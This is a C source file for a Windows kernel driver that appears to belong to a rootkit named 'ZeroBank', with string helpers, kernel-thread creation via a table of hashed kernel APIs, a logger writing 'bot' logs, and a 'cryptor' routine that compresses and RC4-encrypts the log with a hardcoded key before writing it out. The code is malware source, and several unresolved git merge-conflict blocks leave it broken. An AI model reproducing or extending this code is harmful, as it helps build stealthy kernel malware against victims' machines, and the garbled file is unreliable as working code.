#include "common.h"

void *kimemcpy(void *dst, void *src, unsigned int size)
{
	unsigned char *buf = (unsigned char*)dst;
	unsigned char *__src = (unsigned char*)src;
	while (size--)
	{
		*buf++ = *__src++;
	}

	return dst;
}

char *kistrcpy(char *dest, const char *src)
{
	char *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while (*src != 0) {
		*p = *src;
		p++;
		src++;
	}

	*p = 0;
	return dest;
}

char *kistrcat(char *dest, const char *src)
{
	if ((dest == 0) || (src == 0))
		return dest;

	while (*dest != 0)
		dest++;

	while (*src != 0) {
		*dest = *src;
		dest++;
		src++;
	}

	*dest = 0;
	return dest;
}

size_t kistrlen(const char *s)
{
	char *s0 = (char *)s;

	if (s == 0)
		return 0;

	while (*s != 0)
		s++;

	return (s - s0);
}

size_t kistrlenW(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t*)s;

	if (s == 0)
		return 0;

	while (*s != 0)
		s++;

	return (s - s0);
}

wchar_t __stdcall _RtlUpcaseUnicodeChar(IN wchar_t Source)
{
	unsigned short Offset;

	if (Source < 'a')
		return Source;
	if (Source <= 'z')
		return (Source - ('a' - 'A'));

	Offset = 0;

	return Source + (SHORT)Offset;
}

long __stdcall CompareUnicodeString(IN PCUNICODE_STRING String1, IN PCUNICODE_STRING String2, IN BOOLEAN CaseInSensitive)
{
	unsigned short i;
	wchar_t c1, c2;

	for (i = 0; i <= String1->Length / sizeof(WCHAR) && i <= String2->Length / sizeof(WCHAR); i++)
	{
		if (CaseInSensitive)
		{
			c1 = _RtlUpcaseUnicodeChar(String1->Buffer[i]);
			c2 = _RtlUpcaseUnicodeChar(String2->Buffer[i]);
		}
		else
		{
			c1 = String1->Buffer[i];
			c2 = String2->Buffer[i];
		}
		if (c1 < c2)
			return -1;
		else if (c1 > c2)
			return 1;

	}

	return 0;
}

void __stdcall _InitUnicodeString(PUNICODE_STRING String, PWCHAR Source)
{
	SIZE_T destsize = 0;

	if (Source)
	{
		destsize = kistrlenW(Source)*sizeof(WCHAR);
		String->Length = (USHORT)destsize;
		String->MaximumLength = (USHORT)destsize + sizeof(WCHAR);
	}
	else
	{
		String->Length = 0;
		String->MaximumLength = 0;
	}

	String->Buffer = (PWCHAR)Source;
}

BOOLEAN KiIsMdlAdddressValid(IN PMDL Mdl, IN PROOTKIT_API_HASH Hash)
{
	BOOLEAN g_cond;

	if (Hash->_MmIsAddressValid(Mdl) && Mdl->ByteCount > 0 && Mdl->MappedSystemVa != NULL && Mdl->Size > 0)
		g_cond = TRUE;
	else
		g_cond = FALSE;

	return g_cond;

}

VOID KiInitializeKernelModeThread(IN PHANDLE ThreadHandle, IN PROOTKIT_API_HASH Hash, IN PKSTART_ROUTINE Routine, IN PVOID Context OPTIONAL)
{
	NTSTATUS st;
	st = Hash->_PsCreateSystemThread(ThreadHandle, THREAD_ALL_ACCESS, NULL, 0, NULL, Routine, Context);
}

void LogFilterData(IN const char *szFormat, ...)
{
	NTSTATUS st;
	UNICODE_STRING ustr1	= { 0 };
	ANSI_STRING ansi		= { 0 };
	OBJECT_ATTRIBUTES oa	= { 0 };
	IO_STATUS_BLOCK io		= { 0 };
	HANDLE handle;
	ULONG length			= 0;
	CHAR buffer[1024]		= { 0 };
	va_list va;
	BOOLEAN g_cond			= FALSE;
	WCHAR wzBuffer[255]		= { 0 };
	UNICODE_STRING uni		= { 0 };

	va_start(va, szFormat);
	_vsnprintf(buffer, sizeof(buffer) / sizeof(char), szFormat, va);
	va_end(va);

	/*g_Hash._RtlInitAnsiString(&ansi, g_idpath);
	g_Hash._RtlAnsiStringToUnicodeString(&uni, &ansi, TRUE);

	wcscpy_s(wzBuffer, 255, L"\\??\\C:\\Windows\\");
	wcscat_s(wzBuffer, 255, uni.Buffer);
	wcscat_s(wzBuffer, 255, L"\\U\\zb-bot-logs.txt");

	g_Hash._RtlInitUnicodeString(&ustr1,wzBuffer);*/
	g_Hash._RtlInitUnicodeString(&ustr1, L"\\??\\C:\\Users\\alex\\Desktop\\Log.txt");

	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		
	st = MyIopCreateFile(&handle, FILE_APPEND_DATA, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL,0,CreateFileTypeNone,
		NULL,IO_NO_PARAMETER_CHECKING,0,NULL);
	if (!NT_SUCCESS(st))
		return;

	length = kistrlen(buffer);

	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_globalresource, TRUE);

	st = ZwWriteFile(handle, NULL, NULL, NULL, &io, (PVOID)buffer, length, NULL, 0);
	if (!NT_SUCCESS(st))
		return;

	ExReleaseResourceLite(&g_globalresource);
	KeLeaveCriticalRegion();


#ifndef _WIN64
	if (handle != NULL)
		ObpCloseHandle(handle,KernelMode);
#else
	ZwClose(handle);
#endif

	g_Hash._RtlFreeUnicodeString(&uni);
}

<<<<<<< HEAD
PUCHAR CompressZeroBankFile(IN PUCHAR Buffer, IN SIZE_T SizeOfBuffer, IN INT KeyType, OUT PULONG FinalCompressedSize, IN PROOTKIT_API_HASH Hash)
=======
PUCHAR CompressZeroBankFile(IN PUCHAR Buffer, IN SIZE_T SizeOfBuffer,OUT PULONG FinalCompressedSize, IN PROOTKIT_API_HASH Hash)
>>>>>>> adding files
{
	SIZE_T size = 16 * SizeOfBuffer;
	PUCHAR Alloc = NULL;
	PUCHAR container = NULL;
	PUCHAR Out = NULL;
	NTSTATUS st;
	ULONG size1 = 0, size2 = 0;

	st = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, &size1, &size2);
	if (NT_SUCCESS(st))
	{
		container = (UCHAR*)Hash->_ExAllocatePool(NonPagedPool, size);
		Alloc = (UCHAR*)Hash->_ExAllocatePool(NonPagedPool, size1);
		if (container != NULL && Alloc != NULL && Hash->_MmIsAddressValid(container) && Hash->_MmIsAddressValid(Alloc))
		{
			st = RtlCompressBuffer(COMPRESSION_ENGINE_MAXIMUM | COMPRESSION_FORMAT_LZNT1, Buffer, SizeOfBuffer, container, size, 0x1000, FinalCompressedSize, Alloc);
			if (NT_SUCCESS(st))
			{
				
				Out = container;
				
			}
		}
	}

	Hash->_ExFreePoolWithTag(Alloc,0);

	return Out;
}

VOID ZeroBankCryptorWorkRoutine(PVOID Context)
{
	PZERBANK_CRYPTOR_WORKER cw = (PZERBANK_CRYPTOR_WORKER)Context;

	HANDLE handle, whandle;
	OBJECT_ATTRIBUTES oa, woa;
	UNICODE_STRING ustr1, wustr1;
	LARGE_INTEGER large, wlarge;
	IO_STATUS_BLOCK io, wio;
	NTSTATUS st;
	ANSI_STRING ansi;
	FILE_STANDARD_INFORMATION fileinfo = { 0 };
	WCHAR Buffer[255] = { 0 };
	PUCHAR mem = NULL;
	PUCHAR EncryptedDataBuffer = NULL;
	PUCHAR Alloc = NULL;
	ULONG FinalSize = 0;
	rc4_ctx ctx = { 0 };

	/*RtlInitAnsiString(&ansi, g_idpath);
	RtlAnsiStringToUnicodeString(&ustr1, &ansi, TRUE);
	wcscpy_s(Buffer, 255, L"\\??\\C:\\Windows\\");
	wcscat_s(Buffer, 255, ustr1.Buffer);
	wcscat_s(Buffer, 255, L"\\U\\zb-bot-logs.txt");

	RtlInitUnicodeString(&ustr1, Buffer);*/

	RtlInitUnicodeString(&ustr1, L"\\??\\C:\\Users\\alex\\Desktop\\Log.txt");
	InitializeObjectAttributes(&oa, &ustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	st = MyIopCreateFile(&handle, FILE_GENERIC_READ, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);
	if (NT_SUCCESS(st))
	{
		st = IopQueryFileInformation(handle, &fileinfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		if (NT_SUCCESS(st))
		{
			mem = (PUCHAR)cw->Hash->_ExAllocatePool(NonPagedPool, (SIZE_T)fileinfo.EndOfFile.QuadPart);
			if (mem)
			{
				st = IopReadFile(handle, &io, mem, (ULONG)fileinfo.EndOfFile.QuadPart, NULL);
				if (NT_SUCCESS(st))
				{
#ifndef _WIN64
					ObpCloseHandle(handle, KernelMode);
#else
					ZwClose(handle);
#endif

<<<<<<< HEAD
					Alloc = CompressZeroBankFile(mem, (SIZE_T)fileinfo.EndOfFile.QuadPart, RC4_KEY_3, &FinalSize, cw->Hash);
=======
					Alloc = CompressZeroBankFile(mem, (SIZE_T)fileinfo.EndOfFile.QuadPart,&FinalSize, cw->Hash);
>>>>>>> adding files
					if (Alloc != NULL)
					{
						EncryptedDataBuffer = (PUCHAR)cw->Hash->_ExAllocatePool(NonPagedPool, (SIZE_T)fileinfo.EndOfFile.QuadPart);
						if (EncryptedDataBuffer == NULL)
							return;

						rc4_init(&ctx, key3, sizeof(key3));
						rc4_encrypt(&ctx, (const uint8*)Alloc, (uint8*)EncryptedDataBuffer, FinalSize);

						RtlInitUnicodeString(&wustr1, L"\\??\\C:\\Users\\alex\\Desktop\\0000008.txt");
						InitializeObjectAttributes(&woa, &wustr1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

<<<<<<< HEAD
						st = MyIopCreateFile(&whandle, FILE_APPEND_DATA, &woa, &wio,NULL,FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE |FILE_SHARE_READ,
=======
						st = MyIopCreateFile(&whandle, FILE_APPEND_DATA, &woa, &wio,NULL,FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ,
>>>>>>> adding files
							FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL,
							IO_NO_PARAMETER_CHECKING, 0, NULL);
						if (NT_SUCCESS(st))
						{

							KeEnterCriticalRegion();
							ExAcquireResourceExclusiveLite(&g_globalresource, TRUE);

<<<<<<< HEAD
							st = ZwWriteFile(whandle, NULL, NULL, NULL, &wio, EncryptedDataBuffer, FinalSize, NULL, 0);
=======
							st = IopWriteFile(whandle, FILE_APPEND_DATA, &wio, EncryptedDataBuffer, FinalSize, NULL);
							//st = ZwWriteFile(whandle, NULL, NULL, NULL, &wio, EncryptedDataBuffer, FinalSize, NULL, 0);
>>>>>>> adding files
							if (NT_SUCCESS(st))
							{
#ifndef _WIN64
								ObpCloseHandle(whandle, KernelMode);
#else
								ZwClose(whandle);
#endif
								cw->StopWorkerThread = TRUE;
							}

							ExReleaseResourceLite(&g_globalresource);
							KeLeaveCriticalRegion();
						}
						//cw->Hash->_ExFreePoolWithTag(Alloc, 0);
						//Alloc = NULL;
					}
				}
				cw->Hash->_ExFreePoolWithTag(mem, 0);
				mem = NULL;
			}
		}
	}


	if(cw->StopWorkerThread == TRUE)
		cw->Hash->_PsTerminateSystemThread(STATUS_SUCCESS);

}
